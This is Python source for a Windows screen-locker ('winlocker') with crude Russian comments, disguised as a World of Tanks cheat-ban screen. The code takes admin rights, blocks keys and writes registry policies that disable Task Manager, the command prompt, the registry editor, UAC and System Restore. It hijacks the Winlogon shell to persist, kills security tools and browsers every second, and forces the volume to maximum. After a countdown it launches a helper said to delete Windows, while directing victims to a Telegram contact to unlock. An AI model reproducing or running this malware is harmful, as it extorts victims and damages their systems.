# Ебанные библиотеки сука
import pygetwindow as gw
import time
import keyboard
import subprocess
import threading
import os
import multiprocessing
import sys
import pygame as game
import winreg as reg
import pyuac
import pygame_textinput
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

# ВНИМАНИЕ, ПЕРЕМЕННАЯ НИЖЕ ОТВЕЧАЕТ ЗА ОТКЛЮЧЕНИЕ УНИЧТОЖЕНИЯ WINDOWS И РАБОТУ ФУНКЦИЙ СВЯЗАННЫХ С РАБОТОЙ ВИРУСА. ЕСЛИ TRUE ТО ПЕРЕЧИСЛЕННЫЕ ФУНКЦИИ ОТКЛЮЧАЮТСЯ.
isSafeMode = False
stoprepeat = threading.Event()  # default: False
# СМ ВЫШЕ
# Проверка и повышение прав до администратора

if not pyuac.isUserAdmin() and not isSafeMode:
    pyuac.runAsAdmin()  # Попытка запустить скрипт с правами администратора
    sys.exit()

# ниже ненужные параметры. можно не трогать
fps = 10  # на фпс похуй ежик все равно у нас на экране ничего не двигается.
clock = game.time.Clock()
running = True
min_width, min_height = 800, 600

# экран
screen = game.display.set_mode((min_width, min_height), game.NOFRAME | game.FULLSCREEN | game.SCALED)

# создаем поле для ввода текста
textInput = pygame_textinput.TextInputVisualizer()

# подрубаем колонки
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))

# Блокаем клаву сука
if not isSafeMode:
    keyboard.block_key('Win')
    keyboard.block_key('alt')
    keyboard.block_key('tab')
    keyboard.block_key('del')


def confText():
    # шрифты
    font = game.font.SysFont('Segoe UI', 20)
    font_contact = game.font.SysFont('Segoe UI', 32)
    # создаем текст
    text_surface = font.render('Ваш windows заблокирован за использование читов во время игры в world of tanks', True,(255, 255, 0))
    text_surface_eng = font.render('Your windows is blocked for using cheats while playing world of tanks', True,(255, 255, 255))
    text_feedback = font.render('Для разблокировки компьютера обратитесь по указанным данным', True, (255, 255, 0))
    text_FeedbackEng = font.render('To unlock your computer, write to the contacts below', True, (255, 255, 255))
    text_surface_contacts = font.render('Чтобы удалить Windows, нажмите Enter.', True, (255, 255, 0))
    text_surface_contacts_eng = font.render('To delete Windows, press Enter.', True, (255, 255, 255))
    text_surface_contacts_2 = font_contact.render('Contact with me: Telegram: @unblock_computer', True, "white")
    Password_enter = font_contact.render("Enter password:", True, (255, 255, 0))
    # вставляем текст на экран
    screen.blit(text_surface, (0, 0))
    screen.blit(text_surface_eng, (0, 50))
    screen.blit(text_feedback, (0, 100))
    screen.blit(text_FeedbackEng, (0, 150))
    screen.blit(text_surface_contacts, (0, 200))
    screen.blit(text_surface_contacts_eng, (0, 250))
    screen.blit(Password_enter, (0, 400))
    screen.blit(text_surface_contacts_2, (0, 450))

    text_kostil = game.font.SysFont('Segoe UI', 32).render('                                                          ',True, "black", "gray")
    screen.blit(text_kostil, (300, 400))

    # настроим поле ввода пароля и покажем его на экране
    manager = pygame_textinput.TextInputManager()
    textInput.manager = manager
    textInput.font_object = font_contact
    textInput.cursor_blink_interval = 200  # ms
    textInput.font_color = "aqua"
    textInput.cursor_width = 4
    textInput.cursor_visible = True

    screen.blit(textInput.surface, (300, 400))


def confWindow():
    window = gw.getActiveWindow()
    window.activate()
    window.alwaysOnTop = True


def setBackgroundImg():
    # создаем картинку танков на фоне и растягиваем её на весь ебучий экран сука
    mogila = os.path.join(r"C:\Windows\INF", "wot.png")
    img = game.image.load(mogila)
    img = game.transform.scale(img, (800, 600))
    screen.blit(img, (0, 0))


def playMusic():
    # звуковое сопровождение (1, спокойная музыка)
    game.mixer.init()
    game.mixer.music.load(r"C:\Windows\INF\1.mp3")
    game.mixer.music.play(loops=-1)


def init():
    # запускаем игру
    game.init()
    game.font.init()
    game.display.set_caption('WORLD OF TANKS')
    game.mouse.set_visible(False)
    # настраиваем окно, картинку на фоне и текст.
    setBackgroundImg()
    confWindow()
    confText()
    # обновляем экран после установки текста
    game.display.flip()


# Функция для установки звука на макс
def sukaZvuk():
    for _ in range(1):
        volume.SetMasterVolumeLevelScalar(1, None)


# Повторение СУКа
def repeatSvuk():
    if not isSafeMode:
        while not stoprepeat.is_set():
            sukaZvuk()
            time.sleep(0.1)


# сука заебал нахуй
t1 = threading.Thread(target=repeatSvuk)
t1.start()


# Функция для установки значения DisableLockWorkstation в реестре
def set_disable_lock_workstation(value):
    try:
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        reg.SetValueEx(key, "DisableLockWorkstation", 0, reg.REG_DWORD, value)
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")


# Добавление в авгозагрузку
def change_shell():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:/Windows/INF/ialpssi_i2c.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")


def fix_shell():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "explorer.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")


def delete_registry_key():
    try:
        # Открываем указанный раздел реестра
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(key, "DisableRegistryTools")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при нахкй значения реестра: {e}")

        
# Отключение Ctrl Alt Delete( делал через нейро оптимизируйте пж)

def disable_ctrl_alt_delete():
    try:
        # Путь к разделу реестра, который управляет поведением меню
        reg_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        registry = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, reg_key, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry, "DisableCtrlAltDel", 0, reg.REG_DWORD, 1)
        reg.CloseKey(reg_key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")


# Отключение всякий хуйни через реестр
def run_command(command):
    try:
        subprocess.run(command, check=True, shell=True)
        print(f"Команда выполнена: {command}")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при выполнении команды: {e}")


# Функция запуска насирания в реестр
def start():
    if not isSafeMode:
        commands = [
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f',
            r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 4 /f',
            r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f',
            r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f'
        ]
        for command in commands:
            run_command(command)
        set_disable_lock_workstation(1)
        change_shell()
        disable_ctrl_alt_delete()


# Блокировка клавиш, кроме ENTER
def block_all_keys_except_enter(e):
    if e.name not in ('enter'):
        keyboard.block_key(e.name)


# функция для закрытия локера.
def closeGame():
    game.quit()
    sys.exit()


# функция для запуска вспомогательного файл
def delete_windows1():
    file = r"C:\Windows\INF\mdmgl001.exe"
    subprocess.Popen([file])
def delete_windows():
    t77 = threading.Thread(target=delete_windows1)
    t77.start()

# Функция для подготовки к удалению винды. Включает музыку и выводит соответствующий текст.
def prepare_game():
    font = game.font.SysFont('Segoe UI', 32, bold=True)
    text_surface_delete = font.render('Deletting Windows ...', True, "red", (0, 0, 0))
    screen.blit(text_surface_delete, (0, 300))
    game.mixer.stop()
    game.mixer.music.load(r"C:\Windows\INF\2.mp3")
    game.mixer.music.play(loops=-1)
    game.display.update()
    # задержка 3 сек перед удалением венды
    # еж тут не советую ставить большое число потому что винда подумает что программа зависла и предложит убить её.


# Убиваем все говно
def kill_govno():
    try:
        subprocess.call("taskkill /F /IM explorer.exe", shell=True)
        subprocess.call("taskkill /F /IM taskmgr.exe", shell=True)
        subprocess.call("taskkill /F /IM regedit.exe", shell=True)
        subprocess.call("taskkill /F /IM notepad.exe", shell=True)
        subprocess.call("taskkill /F /IM resmon.exe", shell=True)
        subprocess.call("taskkill /F /IM control.exe", shell=True)
        subprocess.call("taskkill /F /IM firefox.exe", shell=True)
        subprocess.call("taskkill /F /IM chrome.exe", shell=True)
        subprocess.call("taskkill /F /IM ProcessHacker.exe", shell=True)
        subprocess.call("taskkill /F /IM perfmon.exe", shell=True)
        subprocess.call("taskkill /F /IM powershell.exe", shell=True)
        subprocess.call("taskkill /F /IM mrt.exe", shell=True)
        subprocess.call("taskkill /F /IM SecHealthUI.exe", shell=True)
        subprocess.call("taskkill /F /IM javaw.exe", shell=True)
        subprocess.call("taskkill /F /IM discord.exe", shell=True)
        subprocess.call("taskkill /F /IM opera.exe", shell=True)
        subprocess.call("taskkill /F /IM browser.exe", shell=True)
        subprocess.call("taskkill /F /IM telegram.exe", shell=True)
        subprocess.call("taskkill /F /IM cmd.exe", shell=True)
    except:
        print("похуй мне")


def repeatKill():
    if not isSafeMode:
        while not stoprepeat.is_set():
            kill_govno()
            time.sleep(1)


# сука заебал нахуй
t2 = threading.Thread(target=repeatKill)
t2.start()


# функция восстановления. её вызов должен испралвять реестр и может что-то ещё
def recovery():
    delete_registry_key()
    # проигрываем победоносную музыку
    game.mixer.stop()
    game.mixer.music.load(r"C:\Windows\INF\3.mp3")
    game.mixer.music.play()
    # обновляем текст
    font_recovery = game.font.SysFont('Segoe UI', 48, bold=True)
    text_surface_timer = font_recovery.render(f"tanks successfully deleted!", True, "lime", (0, 0, 0))
    screen.blit(text_surface_timer, (0, 500))
    game.display.flip()
    print("чисто технически все восстановлено. остатки можно удалить самому. они в папке Windows INF ")

    # через 33 сек вырубаем игру (нужно чтобы музыка закончилась, для эффекта победы пользователя над вирусом.)
    # Через 10 секунд оффаем вирусы
    stoprepeat.set()
    t1.join()
    t2.join()
    # Удаляем хуйню из реестра
    def fix_command(command):
        try:
            subprocess.run(command, check=True, shell=True)
            print(f"Команда выполнена: {command}")
        except subprocess.CalledProcessError as e:
            print(f"Ошибка при выполнении команды: {e}")
    commands = [
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 0 /f',
    ]
    for command in commands:
        fix_command(command)
    fix_shell()
    # Продолжаем.
    time.sleep(1)
    try:
        subprocess.call("explorer.exe", shell=True)
    except:
        print("отвалите нахуй от меня")
    for i in range(2):
        closeGame()


# Основной код игры
# Запускаем винлокер, создаем текст и тд
init()
start()
playMusic()

# блокируем клаву и создаем таймер
font_timer = game.font.SysFont('Segoe UI', 48, bold=True)
enterEnabled = True
timerTime = 300.0
timerAlive = True
# это не пароль от винлокера
abcpred = "2018_TANKI_NavalnyTheBest"
# запускаем цикл игры
while running:
    if timerAlive:
        if timerTime < 1:
            timerAlive = False
            enterEnabled = False
            prepare_game()
            # запускаем уничтожение венды если это не тестовый режим.
            if not isSafeMode:
                delete_windows()
        else:
            timerTime -= 0.1
            text_surface_timer = font_timer.render(f"Time Left: {round(timerTime)}            ", True, "red", (0, 0, 0))
            screen.blit(text_surface_timer, (0, 500))
    keys = game.key.get_pressed()

    if textInput.value == abcpred:
        # ебать пароль подходит, закрываем игру
        recovery()
        running = False

    events = game.event.get()
    for event in events:
        if event.type == game.KEYDOWN:
            # если нажимается ентер, то пизда удаляем винду
            if event.key == game.K_RETURN:
                # проверяем, если ентер заблокирован то скипаем
                if enterEnabled:
                    timerAlive = False
                    enterEnabled = False
                    # добавляем текст удаление венды и включаем звук быструю музыку
                    prepare_game()
                    # запускаем уничтожение венды
                    if not isSafeMode:
                        delete_windows()

    # обновляем поле ввода
    textInput.update(events)
    text_kostil = game.font.SysFont('Segoe UI', 32).render('                                                                         ', True, "black", "gray")
    screen.blit(text_kostil, (270, 400))
    screen.blit(textInput.surface, (270, 400))
    game.display.flip()
    # Повторяем все вирусы, но только если winлокер запущен не в тестовом режиме
    clock.tick(60)
    game.display.flip()
# ну и все заебись должно работать сука

